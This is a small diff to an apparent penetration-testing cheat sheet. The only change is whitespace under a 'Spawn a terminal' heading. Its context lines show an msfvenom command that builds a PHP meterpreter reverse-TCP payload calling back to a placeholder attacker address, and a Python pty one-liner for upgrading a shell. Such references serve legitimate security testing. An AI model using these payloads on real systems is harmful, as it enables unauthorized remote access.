@@ -28,7 +28,8 @@ msfvenom -p php/meterpreter_reverse_tcp lhost=<your-IP-address> lport=<your-port
 <br/>
 
 ### Python
-#### Spawn a terminal 
+#### Spawn a terminal
+
 ```python
 python -c 'import pty;pty.spawn("/bin/bash")';
 ```
